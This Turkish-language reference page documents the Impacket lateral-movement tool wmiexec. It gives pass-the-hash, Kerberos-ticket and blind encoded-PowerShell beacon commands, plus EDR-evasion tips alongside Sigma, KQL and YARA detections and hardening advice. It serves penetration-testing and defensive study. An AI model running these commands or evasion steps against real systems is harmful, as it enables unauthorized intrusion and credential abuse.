# impacket-wmiexec

> **Kategori:** [11. YANAL HAREKET VE UZAK KOD YÜRÜTME (LATERAL MOVEMENT & EXECUTION)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Management Instrumentation (WMI) ve DCOM protokolleri üzerinden Win32_Process sınıfını kullanarak hedef sistemde servis oluşturmadan ve diske ikili bırakmadan uzaktan komut yürüten dosyasız Impacket yanal hareket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-wmiexec` (veya `wmiexec.py`), Fortra/SecureAuth Impacket araç seti içinde yer alan ve Windows işletim sistemlerinde uzaktan komut yürütmek için en yaygın, en güvenilir ve en sessiz kabul edilen yanal hareket (lateral movement) araçlarından biridir.

Geleneksel `psexec` ve `smbexec` yöntemleri, Windows Servis Kontrol Yöneticisi (SCM) üzerinde yeni bir servis tanımlamak zorundadır. Bu durum `System Event ID 7045` (A service was installed) olayını tetikleyerek modern SIEM ve EDR sistemlerinde anında kırmızı alarm üretir. `impacket-wmiexec` ise servis mekanizmasını tamamen devre dışı bırakır. Komut çalıştırma işlemini Windows'un yerleşik yönetim altyapısı olan WMI (Windows Management Instrumentation) ve DCOM (Distributed Component Object Model) üzerinden gerçekleştirir.

wmiexec, hedef makinenin RPC Endpoint Mapper (TCP 135) portuna bağlanır ve dinamik bir RPC portu üzerinden `root\cimv2` WMI ad alanına erişir. Ardından WMI'ın `Win32_Process` sınıfı altındaki `Create` yöntemini çağırarak belirtilen komutu başlatır. Başlatılan komut süreci (`cmd.exe`), doğrudan WMI Sağlayıcı Ana Bilgisayarı olan `WmiPrvSE.exe` sürecinin alt süreci olarak türetilir. Komut çıktıları varsayılan olarak SMB `ADMIN$` paylaşımındaki geçici bir metin dosyasına yazılıp okunur; ancak istenirse `-nooutput` bayrağı ile dosya sistemi etkileşimi tamamen sıfıra indirilerek kör (blind) komut yürütme yapılabilir. Tüm DCOM trafiği NTLMv2 veya Kerberos ile RPC paket seviyesinde şifrelenir (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`).

```
+-------------------------------------------------------------------------+
|                       impacket-wmiexec Mimari Akışı                     |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [wmiexec.py corp.local/admin:pass@192.168.1.15]
                               v
                     +--------------------+
                     | wmiexec.py Engine  |
                     +--------------------+
                               |
               1. RPC Endpoint Mapper (TCP 135)
               2. DCOM Port Negotiation (TCP 49152-65535)
               Connect to: root\cimv2
                               v
                +------------------------------+
                | Hedef Sunucu: WMI Subsystem  |
                | (WmiPrvSE.exe)               |
                +------------------------------+
                               |
               3. Win32_Process.Create()
               CommandLine: cmd.exe /Q /c whoami > \\127.0.0.1\ADMIN$\__out
                               |
                               +-> WmiPrvSE.exe -> cmd.exe (Hedef Kullanıcı)
                               |
               4. Çıktı Yakalama (Localhost SMB ADMIN$)
               [\\127.0.0.1\ADMIN$\__out]
                               v
                +------------------------------+
                | Hedef Disk: C:\Windows\__out |
                | (Geçici Metin Çıktısı)       |
                +------------------------------+
                               |
               5. SMB ReadFile & DeleteFile
               [Çıktı Konsola Basılır ve Dosya Silinir]
               (NOT: -nooutput ile 4. ve 5. adımlar atlanır)
```

### 1.1 Yürütme ve Güvenlik Bağlamı
* **Kullanıcı Bağlamı (User Context):** PsExec ve smbexec'ten farklı olarak wmiexec, komutları otomatik olarak `NT AUTHORITY\SYSTEM` yetkisinde çalıştırmaz. Komutlar, kimlik doğrulaması yapılan kullanıcının (örneğin `CORP\da_admin` veya yerel `Administrator`) güvenlik belirteci (token) bağlamında icra edilir.
* **Gereken Portlar:** DCOM iletişimi için RPC Endpoint Mapper (TCP 135) ve dinamik yüksek RPC port aralığı (TCP 49152–65535) kullanılır. Eğer çıktı alınacaksa ek olarak SMB (TCP 445) gerekir; `-nooutput` modunda ise TCP 445'e kesinlikle dokunulmaz.

### 1.2 DCOM Protokolü, OXID Çözümleme ve RPC Mimarisi
wmiexec, arka planda Windows DCOM ve RPC protokol zincirini şu adımlarla işletir:
1. **Endpoint Mapper Sorgusu (TCP 135):** İstemci, `IObjectExporter` arayüzü üzerinden hedef sistemin dinlediği dinamik RPC portunu öğrenir (OXID Resolution).
2. **DCOM Bağlantısı ve Güvenlik Seviyesi:** Dinamik port üzerinden `IWbemLevel1Login` arayüzüne bağlanır ve `RPC_C_AUTHN_LEVEL_PKT_PRIVACY` (paket şifreleme) seviyesinde oturum kurar.
3. **WMI Metot Çağrısı:** `root\cimv2` ad alanına bağlanılarak `IWbemServices::ExecMethod` çağrısı yapılır; `Win32_Process` sınıfının `Create` metodu argüman olarak sağlanan komut satırıyla tetiklenir.
4. **Süreç İzolasyonu:** WMI servis motoru (`WmiPrvSE.exe`), komutu DCOM istemcisinin kimlik belirtecini (Impersonation Token) kuşanarak çalıştırır.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Servis Kurulumu Yok (No Event ID 7045)** | Windows Servis Yöneticisine dokunmadığı için servis tabanlı tespit kurallarını tamamen atlatma. |
| **Tamamen Dosyasız Yürütme (-nooutput)** | Diske hiçbir dosya yazmadan (çıktı dosyası dahil) doğrudan bellek üzerinden komut/payload tetikleme. |
| **Pass-the-Hash ve Kerberos Desteği** | NTLM hash veya Kerberos biletleri ile DCOM seviyesinde sorunsuz kimlik doğrulama. |
| **Doğal Yönetim Kamuflajı** | WMI çağrıları kurumsal ortamlarda SCCM, SCOM ve envanter yazılımları tarafından sürekli yapıldığı için meşru trafik arasında gizlenme. |
| **UAC Remote Kısıtlama Uyumu** | Yerel yönetici veya etki alanı yöneticisi haklarıyla doğrudan komut çalıştırma kabiliyeti. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-wmiexec | impacket-psexec | impacket-smbexec | SharpWMI |
|---|---|---|---|---|
| **Kullanılan Protokol** | DCOM / WMI (TCP 135) | SMB SCM (TCP 445) | SMB SCM (TCP 445) | DCOM / WMI (C# .NET) |
| **Servis Oluşturma** | Hayır (Servissiz) | Evet (Event ID 7045) | Evet (Event ID 7045) | Hayır |
| **Diske Dosya Bırakma** | Opsiyonel (Sadece çıktı) | Evet (.exe ikilisi) | Opsiyonel (Çıktı) | Hayır |
| **Kullanıcı Yetkisi** | Oturum Açan Kullanıcı | `NT AUTHORITY\SYSTEM` | `NT AUTHORITY\SYSTEM` | Oturum Açan Kullanıcı |
| **Ebeveyn Süreç (Parent)** | `WmiPrvSE.exe` | `services.exe` | `services.exe` | `WmiPrvSE.exe` |
| **EDR Yakalanma Seviyesi** | Düşük / Orta | Çok Yüksek | Orta | Düşük |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-wmiexec`, standart Impacket kimlik doğrulama seçeneklerini ve WMI'a özgü çıktı denetim bayraklarını içerir.

### Genel Sözdizimi
```bash
impacket-wmiexec [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip_veya_fqdn> [Komut] [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| Hedef / Kimlik | `[domain/]user:pass@host` | Etki alanı, kullanıcı adı, parola ve hedef adresi. | `corp.local/admin:Pass!@10.0.0.1` |
| Pass-the-Hash | `-hashes` | NTLM hash ile kimlik doğrulama (`LMHASH:NTHASH`). | `-hashes :51a26b735c02dc...` |
| Kerberos Auth | `-k` | Kerberos kimlik doğrulaması kullanır (`KRB5CCNAME`). | *Argümansız bayrak* |
| Parolasız Mod | `-no-pass` | Parola sorma promptunu atlar. | *Argümansız bayrak* |
| KDC IP Adresi | `-dc-ip` | Kerberos KDC denetleyicisi IP'si. | `-dc-ip 10.0.0.1` |
| Çıktısız Mod | `-nooutput` | Komut çıktısını yakalamaz; diske ve SMB'ye dokunmadan çalıştırır. | *Argümansız bayrak* |
| Çıktı Paylaşımı | `-share` | Çıktı dosyasının yazılacağı SMB paylaşımı (Varsayılan `ADMIN$`). | `-share C$` veya `-share Data` |
| Sessiz Komut | `-silentcommand` | `cmd.exe /Q /c` sarmalamasını kaldırıp komutu yalın çalıştırır. | *Argümansız bayrak* |
| Karakter Kodlaması| `-codec` | Çıktı karakter kodlaması (Türkçe sistemler için `cp1254`). | `-codec cp1254` |
| Hedef IP Zorlama | `-target-ip` | Kerberos FQDN bilet talebinde doğrudan soket IP'sini belirtir. | `-target-ip 192.168.1.15` |
| Zaman Damgası | `-ts` | Konsola basılan her çıktı satırına anlık zaman damgası ekler. | *Argümansız bayrak* |
| Komut Çalıştırma | `[komut]` | Kabuk açmadan doğrudan tek bir komut yürütüp çıkar. | `whoami /all` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Etki Alanı Yöneticisi ile Yarı-İnteraktif WMI Kabuğu Alma
Hedef makinede servis oluşturmadan DCOM üzerinden WMI kabuğu başlatma ve temel sistem bilgilerini alma.

```bash
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - build your payload with care!
[!] Press help for extra shell commands
C:\> whoami
corp\da_admin

C:\> whoami /groups | findstr Admin
CORP\Domain Admins                               Group            S-1-5-21-123456789-123456789-123456789-512 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                           Alias            S-1-5-32-544                               Mandatory group, Enabled by default, Enabled group

C:\> exit
[*] Cleaning up...
[+] Done
```

### Senaryo 2: Pass-the-Hash (PtH) ile NTLM Hash Kullanarak Oturum Açma
Açık metin parolası bilinmeyen bir yerel yönetici veya etki alanı yöneticisinin NTLM özeti ile WMI oturumu başlatma.

```bash
impacket-wmiexec -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.20
```

### Senaryo 3: Kerberos Bileti (.ccache) ile Tamamen Parolasız Yanal Hareket
Linux bilet önbelleğindeki Kerberos biletini kullanarak hedef sunucuya Kerberos kimlik doğrulamasıyla bağlanma.

```bash
export KRB5CCNAME=/tmp/da_admin.ccache
impacket-wmiexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local
```

### Senaryo 4: Sıfır Dosya İzi ile Kör Komut Çalıştırma (-nooutput)
Diske hiçbir metin dosyası yazdırmadan ve SMB portuna dokunmadan C2 beacon'ını arka planda tetikleme.

```bash
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15 -nooutput "powershell.exe -enc JABjAGwAaQBlAG4AdAA..."
```

### Senaryo 5: ADMIN$ Yerine C$ Paylaşımını Kullanarak Çıktı Alma
`ADMIN$` paylaşımının izlendiği veya sınırlandırıldığı ortamlarda çıktı paylaşımını `C$` olarak belirleme.

```bash
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15 -share C$
```

### Senaryo 6: İnteraktif Olmayan Tekil Yönetimsel Komut Yürütme
Kabuk açmadan doğrudan uzaktaki güvenlik duvarı kuralını veya servisi tek satırda sorgulama.

```bash
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "net localgroup administrators"
```

### Senaryo 7: PowerShell Komutu ile EDR ve Antivirüs Durumu Sorgulama
Hedef sistemde çalışan güvenlik ajanlarını ve Defender servis durumunu WMI üzerinden uzaktan denetleme.

```bash
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15 "powershell.exe -c Get-MpComputerStatus | select RealTimeProtectionEnabled, AntivirusEnabled"
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] Connection refused on port 135` | Hedef makinede RPC servisi kapalı veya ağ/ana makine güvenlik duvarı TCP 135 portunu engelliyor. | Hedefin açık olduğunu doğrulayın; TCP 135 kapalıysa SMB tabanlı `impacket-psexec` veya WinRM `Evil-WinRM` kullanın. |
| `[-] WMI SessionError: 0x80070005 (Access is denied)` | Kimlik doğrulandı ancak kullanıcının DCOM veya WMI uzaktan erişim izni yok ya da Remote UAC devrede. | Etki alanı yöneticisi hesabı kullanın; yerel hesap ise hedefte `LocalAccountTokenFilterPolicy=1` olmalıdır. |
| `[-] Cannot open output file ... STATUS_OBJECT_NAME_NOT_FOUND` | Geri döngü SMB bağlantısı (`127.0.0.1`) engelleniyor veya `ADMIN$` paylaşımına yazma yetkisi yok. | `-nooutput` bayrağı ile çıktısız çalıştırın veya `-share C$` parametresini deneyin. |
| `RPC_S_SERVER_UNAVAILABLE (0x800706BA)` | TCP 135 portu açık olmasına rağmen dinamik RPC port aralığı (TCP 49152-65535) güvenlik duvarı tarafından engelleniyor. | Ağ anahtarları veya host güvenlik duvarındaki RPC filtrelerini kontrol edin veya tek port kullanan WinRM'e geçin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hedef makinenin SPN kaydı Active Directory KDC'de bulunamadı. | Hedef IP yerine FQDN (`FS01.corp.local`) kullanın ve `-dc-ip` ile çalışan bir DC belirtin. |
| `[-] Codec error: 'charmap' codec can't decode byte...` | Hedef sistem standart dışı dil kodlaması kullanıyor (Örn: Türkçe Windows). | `-codec cp1254` parametresi ekleyerek karakter kodlamasını Türkçe Windows için zorlayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

`impacket-wmiexec`, servis oluşturmadığı ve diske ikili dosya yazmadığı için PsExec'e göre **çok daha yüksek bir OPSEC profiline** sahiptir. Ancak `WmiPrvSE.exe` sürecinin `cmd.exe` başlatması ve varsayılan modda `127.0.0.1` üzerinden geçici dosya oluşturulması EDR davranış analizlerinde izlenebilir.

```
[impacket-wmiexec Yürütmesi]
          │
          ├──> RPC/DCOM Bağlantısı ─────────────> Windows Event ID 4624 (Logon Type 3 / NTLM veya Kerberos)
          │                                      WMI Operational Event ID 5861
          │
          ├──> Win32_Process.Create() ──────────> Sysmon Event ID 1 (Process Creation)
          │                                      ParentImage: WmiPrvSE.exe -> Image: cmd.exe
          │
          ├──> Çıktı Dosyasına Yönlendirme ──────> Event ID 5145 (AccessMask: 0x2 / WriteData)
          │                                      Sysmon Event ID 11 (FileCreate: ADMIN$\__output)
          │
          └──> Çıktı Dosyasının Silinmesi ───────> Sysmon Event ID 23 (FileDelete)
               (NOT: -nooutput modunda dosya olayları tamamen engellenir)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Sysmon Event ID 1 (Process Creation):** `ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe` sürecinin `cmd.exe /Q /c ...` şeklinde alt süreç başlatması en temel davranışsal EDR tespit kuralıdır.
* **WMI Activity Operational Log (Microsoft-Windows-WMI-Activity/Operational - Event ID 5861):** WMI ad alanına bağlanma ve yordam çalıştırma kayıtları tutulur.
* **Security Event ID 4624 (Logon Type 3):** Hedef sistemde ağ üzerinden kimlik doğrulama oturumu açıldığı kaydedilir.
* **Security Event ID 5145 (Detailed File Share Access):** Varsayılan modda `ADMIN$` altında geçici çıktı dosyasının oluşturulması loglanır (`-nooutput` kullanılırsa bu log oluşmaz).

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Execution** | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | DCOM WMI `Win32_Process` ile komut yürütme. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `cmd.exe` üzerinden komut işletimi. |
| **Lateral Movement** | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | Çıktı yakalama amacıyla SMB paylaşımının kullanımı. |
| **Defense Evasion** | [T1070.004](https://attack.mitre.org/techniques/T1070/004/) | File Deletion | Çıktı dosyasının okunup hemen silinmesi. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **Parent Process EDR Tespiti** | `WmiPrvSE.exe` ebeveyn sürecinin `cmd.exe` türetmesi EDR'lar için bilinen bir anomalidir. | `-silentcommand` kullanın; doğrudan komut yerine meşru bir Windows ikilisini veya zamanlanmış görevi tetikleyin. |
| **Geçici Dosya İzi** | `ADMIN$\__output` dosyasının dosya sistemi izleme araçlarınca (FIM) yakalanması. | `-nooutput` bayrağı ile çıktısız çalışın ve C2 beacon / reverse shell tetikleyin. |
| **Dinamik RPC Port Anomalisi** | Güvenlik duvarının TCP 135 ve rastgele 49152+ portlarına trafiği şüpheli görmesi. | RPC yerine kurumsal olarak açık olan WinRM (TCP 5985) protokolünü (`Evil-WinRM`) tercih edin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (WMI Remote Process Creation via WmiPrvSE)
```yaml
title: Process Creation via WMI Execution (WmiPrvSE Spawn)
id: b1c2d3e4-1234-5678-90ab-cdef01234567
status: production
description: WmiPrvSE.exe tarafından cmd.exe veya powershell.exe başlatıldığı tespit edildi (wmiexec davranışı).
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    ParentImage|endswith: '\wbem\WmiPrvSE.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
    CommandLine|contains:
      - '/Q /c'
      - '127.0.0.1'
      - '> '
  condition: selection
falsepositives:
  - Bazı eski yedekleme ve merkezi envanter scriptleri
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
DeviceProcessEvents
| where InitiatingProcessFileName =~ "WmiPrvSE.exe"
| where FileName in~ ("cmd.exe", "powershell.exe")
| where ProcessCommandLine has "127.0.0.1" or ProcessCommandLine has "/Q /c"
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_WMIExec_Script_Artifact {
    meta:
        description = "impacket-wmiexec Python script statik tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "wmiexec" ascii wide nocase
        $s2 = "Win32_Process" ascii
        $s3 = "WMIEXEC" ascii
        $s4 = "semi-interactive shell" ascii
        $s5 = "root\\cimv2" ascii
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **WMI Uzaktan Erişim İzinlerinin Kısıtlanması:** `dcomcnfg` (Component Services) üzerinden WMI ad alanlarına uzaktan erişim hakları sıkılaştırılmalı, standart etki alanı kullanıcılarının DCOM Remote Launch ve Activate yetkileri kaldırılmalıdır.
* **Ana Makine Güvenlik Duvarı ile RPC İzolasyonu:** İstemciler arası (workstation-to-workstation) TCP 135 ve dinamik RPC portları (49152-65535) Windows Defender Firewall ile engellenmelidir.
* **Remote UAC Kısıtlaması:** `LocalAccountTokenFilterPolicy` kayıt defteri değeri `0` bırakılarak yerel yöneticilerin uzaktan WMI ile tam yetki kazanması engellenmelidir.
* **WMI Activity ve Sysmon Denetimi:** Event ID 5861 ve Sysmon Event ID 1 günlükleri aktif edilerek `WmiPrvSE.exe` süreçlerinin komut satırı argümanları SIEM'de sürekli denetlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Standart Parola ile Yarı-İnteraktif WMI Kabuğu Alma
impacket-wmiexec corp.local/da_admin:P@ssword2026!@192.168.1.15

# 2. Pass-the-Hash (NTLM Hash) ile WMI Oturumu Başlatma
impacket-wmiexec -hashes :51a26b735c02dcda234b21651d30f7b1 Administrator@192.168.1.15

# 3. Kerberos Bileti (.ccache) ile Parolasız Yanal Hareket
export KRB5CCNAME=/tmp/da_admin.ccache && impacket-wmiexec -k -no-pass -dc-ip 192.168.1.10 CORP.LOCAL/da_admin@FS01.corp.local

# 4. Sıfır Dosya İzi ile Kör (Blind) Komut Yürütme
impacket-wmiexec corp.local/da_admin:P@ss!@192.168.1.15 -nooutput "powershell.exe -enc ..."

# 5. ADMIN$ Yerine C$ Paylaşımını Kullanarak Çıktı Alma
impacket-wmiexec corp.local/da_admin:P@ss!@192.168.1.15 -share C$

# 6. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
impacket-wmiexec corp.local/da_admin:P@ss!@192.168.1.15 "whoami /priv"

# 7. Yerel SAM Hesabı ile WMI Oturumu Başlatma
impacket-wmiexec ./Administrator:LocalAdminPass!@192.168.1.20

# 8. Türkçe Karakter Desteği için Codec Tanımlama
impacket-wmiexec corp.local/da_admin:P@ss!@192.168.1.15 -codec cp1254

# 9. Hedef FQDN Çözümlenemediğinde IP Adresini Zorlama
impacket-wmiexec -k -no-pass -target-ip 192.168.1.15 CORP.LOCAL/da_admin@FS01.corp.local

# 10. Sessiz Mod ile cmd.exe /Q /c Sarmalamasını Kaldırma
impacket-wmiexec corp.local/da_admin:P@ss!@192.168.1.15 -silentcommand "whoami"
```

### Komut Detay Analizleri

#### 1. Standart Parola ile Yarı-İnteraktif WMI Kabuğu Alma
* **Ne Yapar?:** TCP 135 üzerinden WMI `Win32_Process` sınıfı ile bağlantı kurar, servis oluşturmadan komut kabuğu başlatır ve çıktıları SMB ile konsola aktarır.
* **Ne Zaman Kullanılır?:** PsExec'in servis oluşturma kısıtlamalarına takılmadan en sessiz yanal hareketi gerçekleştirmek için.
* **Parametreler:**
  * `corp.local/da_admin:P@ssword2026!`: Etki alanı kimlik bilgileri.
  * `@192.168.1.15`: Hedef sunucu IP adresi.

#### 2. Pass-the-Hash (NTLM Hash) ile WMI Oturumu Başlatma
* **Ne Yapar?:** Açık metin parola olmadan, ele geçirilen NTLM hash ile DCOM kimlik doğrulaması yaparak komut istemi açar.
* **Ne Zaman Kullanılır?:** Parolası kırılamayan yönetici hesaplarıyla sessiz yanal hareket yaparken.
* **Parametreler:**
  * `-hashes :<NTHASH>`: NTLM özet bilgisi.

#### 3. Kerberos Bileti (.ccache) ile Parolasız Yanal Hareket
* **Ne Yapar?:** Linux ortamındaki bilet önbelleğini kullanarak NTLM kullanmadan doğrudan Kerberos bilet taklidi ile WMI oturumu açar.
* **Ne Zaman Kullanılır?:** NTLM trafiğinin izlendiği sıkılaştırılmış ortamlarda.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulaması.
  * `-no-pass`: Parola promptunu atlar.

#### 4. Sıfır Dosya İzi ile Kör (Blind) Komut Yürütme
* **Ne Yapar?:** Çıktı dosyasını SMB paylaşımına yönlendirmez; komutu arka planda çalıştırıp hemen çıkar.
* **Ne Zaman Kullanılır?:** C2 ajanı veya ters bağlantı (reverse shell) tetiklerken diske kesinlikle dokunmamak için.
* **Parametreler:**
  * `-nooutput`: Çıktı yakalamayı ve dosya oluşturmayı tamamen iptal eder.

#### 5. ADMIN$ Yerine C$ Paylaşımını Kullanarak Çıktı Alma
* **Ne Yapar?:** Geçici çıktı dosyasını `C:\Windows\` yerine doğrudan `C:\` kök dizinine yazar.
* **Ne Zaman Kullanılır?:** `ADMIN$` erişiminin kısıtlı olduğu veya izlendiği durumlarda.
* **Parametreler:**
  * `-share C$`: Çıktı paylaşımını belirler.

#### 6. Tek Komut Çalıştırıp Sonucu Alma ve Çıkma
* **Ne Yapar?:** İnteraktif döngüye girmeden tek bir komut işletir, çıktısını ekrana yazar ve çıkar.
* **Ne Zaman Kullanılır?:** Hızlı yetki veya grup kontrolü yapmak için.
* **Parametreler:**
  * Komut dizesi parametre olarak sona eklenir.

#### 7. Yerel SAM Hesabı ile WMI Oturumu Başlatma
* **Ne Yapar?:** Etki alanı yerine hedef makinenin yerel SAM veritabanındaki hesapla kimlik doğrular.
* **Ne Zaman Kullanılır?:** LAPS parolası veya yerel yönetici parolası bilinen bağımsız sistemlerde.
* **Parametreler:**
  * `./Administrator`: Yerel hesap bağlamı.

#### 8. Türkçe Karakter Desteği için Codec Tanımlama
* **Ne Yapar?:** Türkçe Windows sistemlerinden dönen çıktılardaki karakter bozulmalarını düzeltir.
* **Ne Zaman Kullanılır?:** Çıktıların düzgün okunmasını sağlamak için.
* **Parametreler:**
  * `-codec cp1254`: Windows-1254 Türkçe kodlaması.

#### 9. Hedef FQDN Çözümlenemediğinde IP Adresini Zorlama
* **Ne Yapar?:** Kerberos için FQDN adına bilet alırken ağ bağlantısını verilen IP'ye zorlar.
* **Ne Zaman Kullanılır?:** Yerel DNS çözümleme sorunlarında.
* **Parametreler:**
  * `-target-ip 192.168.1.15`: Hedef IP adresi.

#### 10. Sessiz Mod ile cmd.exe /Q /c Sarmalamasını Kaldırma
* **Ne Yapar?:** Komutun `cmd.exe /Q /c` parametreleri ile sarmalanmasını önler; doğrudan belirtilen ikiliyi çalıştırır.
* **Ne Zaman Kullanılır?:** EDR komut satırı inceleme kurallarını yanıltmak için.
* **Parametreler:**
  * `-silentcommand`: Komut sarmalama bayrağını kaldırır.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [Microsoft Dokümantasyonu: Win32_Process Sınıfı](https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-process)
* [Microsoft Open Specifications: [MS-WMI] Windows Management Instrumentation Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/)
* [Microsoft Open Specifications: [MS-DCOM] Distributed Component Object Model Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/)
* [MITRE ATT&CK: Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/)
* [SpecterOps: Exploring WMI Internals and Defense Bypass](https://posts.specterops.io/)

---

> **Önceki:** [← impacket-smbexec](./impacket-smbexec.md) · **Sonraki:** [impacket-atexec →](./impacket-atexec.md)
